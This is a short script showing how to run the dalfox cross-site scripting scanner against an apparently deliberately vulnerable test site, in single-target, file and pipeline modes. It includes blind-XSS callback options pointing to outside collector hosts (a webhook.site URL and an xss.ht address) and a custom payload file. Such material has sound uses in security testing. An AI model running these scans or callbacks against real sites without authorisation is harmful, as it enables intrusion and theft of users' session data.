
###Single target mode
target="http://testphp.vulnweb.com/artists.php?artist=1"

dalfox url "$target" -b https://webhook.site/5a4802ff-a2be-4cf1-b84a-a9e3b79d7aef


#dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://hahwul.xss.ht

exit
###Multiple target mode from file

dalfox file url.txt –custom-payload ./mypayloads.txt

###Pipeline mode

cat url.txt | dalfox pipe
